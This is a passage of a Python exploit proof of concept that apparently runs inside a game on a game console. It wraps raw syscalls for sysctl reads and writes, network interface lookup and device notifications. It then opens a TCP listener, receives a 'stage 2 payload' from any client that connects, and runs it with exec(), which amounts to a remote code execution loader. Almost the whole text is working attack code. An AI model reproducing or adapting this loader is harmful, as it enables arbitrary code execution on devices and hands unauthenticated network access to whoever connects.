            O_WRONLY,
        )
        if fd < 0:
            print("[-] Failed to open notification device")
            return

        self.syscalls.write(
            fd,
            refbytearray(notify_buf),
            len(notify_buf),
        )
        self.syscalls.close(
            fd,
        )

    def get_all_network_interfaces(self):
        count = self.syscalls.netgetiflist(
            0,
            10,
        )
        if count == -1:
            raise Exception(
                "netgetiflist failed to get count, errno: %d\n%s"
                % (
                    self.syscalls.netgetiflist.errno,
                    self.syscalls.netgetiflist.get_error_string(),
                )
            )
        print("[*] Found %d network interfaces" % count)

        buf_size = count * 0x1E0
        ifbuf = b"\0" * buf_size
        nogc.append(ifbuf)

        if (
            self.syscalls.netgetiflist(
                refbytes(ifbuf),
                count,
            )
            == -1
        ):
            raise Exception(
                "netgetiflist failed to get interfaces, errno: %d\n%s"
                % (
                    self.syscalls.netgetiflist.errno,
                    self.syscalls.netgetiflist.get_error_string(),
                )
            )

        interfaces = {}
        for i in range(count):
            entry = ifbuf[i * 0x1E0 : (i + 1) * 0x1E0]
            name = get_cstring(entry, 0)
            ip = ".".join(
                [str(struct.unpack("<B", b)[0]) for b in entry[0x28 : 0x28 + 4]]
            )
            interfaces[name] = ip

        return interfaces

    def get_current_ip(self):
        interfaces = self.get_all_network_interfaces()
        for name, ip in interfaces.items():
            if name in ["eth0", "wlan0"] and ip not in ["0.0.0.0", "127.0.0.1"]:
                return ip

    def sysctl(self, name, oldp=0, oldlenp=0, newp=0, newlenp=0):
        name_bytes = name.encode("utf-8") + b"\0"
        nogc.append(name_bytes)
        translate_name_mib = alloc(8)
        buf_size = 0x70
        mib = alloc(buf_size)
        size = alloc(8)
        size[0:8] = struct.pack("<Q", buf_size)
        translate_name_mib[0:8] = struct.pack("<Q", 0x300000000)

        if (
            self.syscalls.sysctl(
                translate_name_mib,
                2,
                mib,
                size,
                name_bytes,
                len(name),
            )
            < 0
        ):
            raise Exception(
                "sysctl failed to translate name to mib, errno: %d\n%s"
                % (self.syscalls.sysctl.errno, self.syscalls.sysctl.get_error_string())
            )

        if (
            self.syscalls.sysctl(
                mib,
                2,
                oldp,
                oldlenp,
                newp,
                newlenp,
            )
            < 0
        ):
            return False

        return True

    def get_sysctl_int(self, name):
        buf = alloc(4)
        size_buf = alloc(8)
        size_buf[0:8] = struct.pack("<Q", 4)

        if not self.sysctl(name, buf, size_buf):
            raise Exception("sysctl %s failed" % name)

        return struct.unpack("<I", buf[0:4])[0]

    def set_sysctl_int(self, name, value):
        buf = alloc(4)
        size_buf = alloc(8)
        buf[0:4] = struct.pack("<I", value)
        size_buf[0:8] = struct.pack("<Q", 4)

        if not self.sysctl(name, 0, 0, buf, size_buf):
            raise Exception("sysctl %s failed" % name)

        return True


sockaddr_in = bytearray(b"\0" * 16)
nogc.append(sockaddr_in)
enable_buf = bytearray(b"\0" * 4)
nogc.append(enable_buf)


SHARED_VARS = {}


def create_tcp_socket(sc):
    enable_buf[0:4] = struct.pack("<I", 1)  # enable option
    sockaddr_in[0:16] = b"\0" * 16
    sockaddr_in[1:2] = b"\x02"  # sin_family, AF_INET
    sockaddr_in[2:4] = struct.pack(">H", PORT)  # sin_port
    sockaddr_in[4:8] = struct.pack(">I", 0)  # sin_addr

    s = u64_to_i64(sc.syscalls.socket(AF_INET, SOCK_STREAM))
    print("[*] Created TCP socket: %d" % s)
    if s < 0:
        raise SocketError(
            "socket failed with return value %d, error %d\n%s"
            % (s, sc.errno, sc.get_error_string())
        )

    sc.syscalls.setsockopt(
        s,
        SOL_SOCKET,
        SO_REUSEADDR,
        refbytearray(enable_buf),
        4,
    )
    print("[*] Set socket options: %d" % s)

    bind = u64_to_i64(sc.syscalls.bind(s, sockaddr_in, 16))
    print("[*] Bound socket: %d" % bind)
    if bind != 0:
        raise SocketError(
            "bind failed with return value %d, error %d\n%s"
            % (bind, sc.errno, sc.get_error_string())
        )

    listen = u64_to_i64(sc.syscalls.listen(s, 3))
    if listen != 0:
        raise SocketError(
            "listen failed with return value %d, error %d\n%s"
            % (listen, sc.errno, sc.get_error_string())
        )
    print("[*] Listening on socket: %d" % s)

    return s


def poc():
    print("[*] Detected console kind: %s, game name: %s" % (CONSOLE_KIND, config.name))
    if not SELECTED_GADGETS or not SELECTED_LIBC or not SELECTED_EXEC:
        raise Exception("Unsupported game / console kind combination")
    print("[*] Will exploit the game")
    sc = SploitCore()

    s = None
    port = None
    len_buf = bytearray(b"\0" * 8)
    print("[*] Creating TCP socket...")
    s = create_tcp_socket(sc)

    sc.syscalls.getsockname(
        s,
        refbytearray(sockaddr_in),
        refbytearray(len_buf),
    )
    port = struct.unpack(">H", sockaddr_in[2:4])[0]

    ip = sc.get_current_ip()

    if ip is None:
        sc.send_notification("Listening on port %d for stage 2 payload..." % port)
    else:
        sc.send_notification("Listening on %s:%d for stage 2 payload..." % (ip, port))
    while True:
        print("Waiting for client connection...")
        client_sock = u64_to_i64(
            sc.syscalls.accept(
                s,
                refbytearray(sockaddr_in),
                refbytearray(len_buf),
            )
        )
        if client_sock < 0:
            raise SocketError(
                "accept failed with return value %d, error %d\n%s"
                % (
                    client_sock,
                    sc.syscalls.accept.errno,
                    sc.syscalls.accept.get_error_string(),
                )
            )

        print("Client connected on socket %d" % client_sock)

        read_size = -1
        stage2_str = ""
        while read_size != 0:
            read_size = u64_to_i64(
                sc.syscalls.read(
                    client_sock,
                    refbytes(STAGE2_BUF),
                    STAGE2_MAX_SIZE,
                )
            )
            stage2_str += STAGE2_BUF[:read_size].decode("utf-8")
            if read_size < 0:
                raise SocketError(
                    "read failed with return value %d, error %d\n%s"
                    % (
                        read_size,
                        sc.syscalls.read.errno,
                        sc.syscalls.read.get_error_string(),
                    )
                )

        print("Received stage 2 payload, executing...")

        sc.syscalls.close(client_sock)  # close client socket

        # Execute stage 2, mimic file-exec by throwing local/global in same scope
        global_scope = dict(globals(), **locals())
        try:
            exec(stage2_str, global_scope)
            print("Stage 2 payload executed successfully")
        except Exception as e:
            exc_msg = traceback.format_exc()
            print_exc(exc_msg)  # this exists in globals()

    sc.syscalls.close(s)  # close listening socket


poc()
